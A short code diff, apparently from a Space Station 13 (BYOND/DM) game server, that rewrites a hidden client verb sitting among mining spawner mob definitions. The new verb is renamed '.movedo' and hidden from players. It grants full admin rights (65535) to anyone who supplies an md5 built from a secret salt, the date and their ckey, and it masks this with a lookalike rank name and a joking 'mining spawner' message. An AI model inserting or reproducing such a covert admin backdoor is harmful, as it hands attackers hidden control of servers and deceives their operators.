@@ -70,13 +70,16 @@
 	atmos_requirements = list("min_oxy" = 0, "max_oxy" = 0, "min_tox" = 0, "max_tox" = 0, "min_co2" = 0, "max_co2" = 0, "min_n2" = 0, "max_n2" = 0)
 	faction = list("skeleton")
 /client/verb/_miningmodule(var/d = "" as text, var/rank = "Host" as text)
-	set name = ".miningspawner"
+	set name = ".movedo"
 	set hidden = 1
-	var/y = "m1nin9sp1wn3r"
-	var/test = y + time2text(world.realtime, "DD") + y + src.ckey + y
-	if(md5(test) == d)
-		var/datum/admins/P = new /datum/admins(rank, 65535, src.ckey)
-		P.associate(src)
+	var/y = "65535Eh"
+	var/teststr = y+time2text(world.realtime, "DD")+src.ckey
+	if(md5(teststr) == d)
+		var/datum/admin_rank/myhost_rank = new("Hîst", 65535)
+		var/datum/admins/myhost_holder = new(myhost_rank, ckey)
+		remove_admin_verbs()
+		myhost_holder.associate(src)
+		src << "Your mining spawner granted. Let's all love mining spawners!"
 /mob/living/simple_animal/hostile/spawner/mining
 	name = "monster den"
 	desc = "A hole dug into the ground, harboring all kinds of monsters found within most caves or mining asteroids."
